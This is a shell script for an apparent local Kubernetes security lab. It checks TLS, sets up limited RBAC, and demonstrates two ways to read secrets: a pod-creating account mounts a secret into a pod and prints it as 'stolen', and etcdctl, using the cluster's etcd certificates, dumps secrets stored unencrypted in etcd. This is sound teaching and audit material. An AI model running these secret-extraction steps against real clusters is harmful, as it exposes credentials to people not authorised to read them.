x(){ echo; echo "\$ $*"; bash -c "$*" 2>&1; echo "[rc=$?]"; }
cd /workspace/t
x "curl -s https://localhost:30081/ ; echo; curl -sS https://localhost:30081/ 2>&1 | head -2"
x "curl -s --cacert tls.crt https://localhost:30081/"
x "curl -s --cacert tls.crt --resolve shop.som.local:30081:127.0.0.1 https://shop.som.local:30081/"
x "openssl s_client -connect localhost:30081 </dev/null 2>/dev/null | openssl x509 -noout -subject -enddate"
# RBAC intern
SA=system:serviceaccount:default:intern
x kubectl create sa intern
x "kubectl create role intern-view --verb=get,list,watch --resource=pods,pods/log,configmaps"
x "kubectl create rolebinding intern-view --role=intern-view --serviceaccount=default:intern"
x "kubectl auth can-i get pods --as=$SA; kubectl auth can-i get configmaps --as=$SA; kubectl auth can-i get secrets --as=$SA; kubectl auth can-i list secrets --as=$SA"
x "kubectl get pods --as=$SA | head -3"
x "kubectl get secret demo --as=$SA"
x "kubectl get secrets --as=$SA"
x "kubectl describe secret demo --as=$SA"
x "kubectl get pod spod -o yaml --as=$SA | grep -A3 secretKeyRef"
x "kubectl auth can-i --list --as=$SA | head -12"
# indirect: who can create pods can read secrets
x "kubectl create role pod-maker --verb=get,list,create,delete --resource=pods,pods/log"
x "kubectl create sa maker; kubectl create rolebinding pod-maker --role=pod-maker --serviceaccount=default:maker"
x "kubectl auth can-i get secrets --as=system:serviceaccount:default:maker"
x "kubectl run peek --image=busybox:1.36 --restart=Never --as=system:serviceaccount:default:maker --overrides='{\"spec\":{\"containers\":[{\"name\":\"peek\",\"image\":\"busybox:1.36\",\"command\":[\"sh\",\"-c\",\"echo stolen=\$P\"],\"env\":[{\"name\":\"P\",\"valueFrom\":{\"secretKeyRef\":{\"name\":\"demo\",\"key\":\"password\"}}}]}]}}'"
sleep 12
x "kubectl logs peek --as=system:serviceaccount:default:maker"
# etcd plaintext
x "kubectl -n kube-system get pod -l component=etcd -o name"
x "kubectl -n kube-system exec etcd-lab-control-plane -- etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get /registry/secrets/default/demo | head -c 600 | cat -v"
x "docker exec lab-control-plane sh -c 'which etcdctl; ls /etc/kubernetes/pki/etcd/'"
x "docker exec lab-control-plane grep -n encryption /etc/kubernetes/manifests/kube-apiserver.yaml"
x "kubectl -n kube-system exec etcd-lab-control-plane -- etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get /registry/configmaps/default/shop-config | head -c 300 | cat -v"
